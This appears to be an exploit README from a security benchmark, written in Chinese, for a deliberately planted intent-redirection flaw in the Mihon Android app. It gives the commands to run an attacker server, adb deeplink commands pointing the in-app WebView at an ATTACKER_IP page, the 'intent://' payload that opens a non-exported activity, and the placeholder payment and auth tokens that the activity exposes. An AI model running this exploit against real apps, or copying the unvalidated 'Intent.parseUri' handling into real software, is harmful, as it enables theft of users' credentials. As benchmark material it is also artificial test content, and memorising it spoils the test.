# 2.3.1 Insecure External Navigation Scheme Handling EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 会把外部传入的网页交给 `WebViewActivity` 加载。漏洞样本在 `WebViewScreenContent.shouldOverrideUrlLoading()` 中对 `intent://` 链接执行：

```text
Intent.parseUri(url, Intent.URI_INTENT_SCHEME)
startActivity(intent)
```

由于没有校验页面来源、目标包名、目标组件名或是否允许启动内部组件，攻击者控制的页面可以构造显式 `intent://` 链接，让 WebView 代应用启动非导出的 `TrackAccountStatementActivity`。该 Activity 会读取 `assets/benchmark_mock_data.json` 中的 tracking token、源站认证 header 和支付 token，并展示内部账户明细。

## 运行服务端

```powershell
cd .\exp\mihon-0.19.9\2.3.1_Insecure_External_Navigation_Scheme_Handling
python .\server.py
```

服务端会监听 `8000`，攻击页面路径为：

```text
http://<ATTACKER_IP>:8000/exp/2.3.1
```

## 触发 deeplink

将 `<ATTACKER_IP>` 替换为运行 `server.py` 的机器 IP：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F2.3.1"
```

如果设备上有多个 Mihon 构建，也可以指定 debug 包：

```powershell
adb shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F<ATTACKER_IP>%3A8000%2Fexp%2F2.3.1" app.mihon.debug
```

## 预期结果

1. Android 通过 `mihon://help/webview` 打开已导出的 `DeepLinkActivity`。
2. `DeepLinkActivity` 将 `url` 参数转交给 `WebViewActivity`。
3. WebView 加载 `http://<ATTACKER_IP>:8000/exp/2.3.1`。
4. 页面自动跳转到显式 `intent://...component=<package>/eu.kanade.tachiyomi.ui.setting.track.TrackAccountStatementActivity;end`。
5. 漏洞分支中的 WebView 直接解析并启动该 Intent，显示内部阅读同步账户明细。

成功时屏幕会切换到 `TrackAccountStatementActivity`，能看到类似以下敏感字段：

```text
Payment token: benchmark-payment-token
Source authorization: Bearer benchmark-source-auth-header
anilist token: benchmark-anilist-track-token
myanimelist token: benchmark-myanimelist-track-token
```

EXP 页面会依次尝试以下包名，覆盖常见构建：

```text
app.mihon.debug
app.mihon.benchmark
app.mihon.dev
app.mihon
```
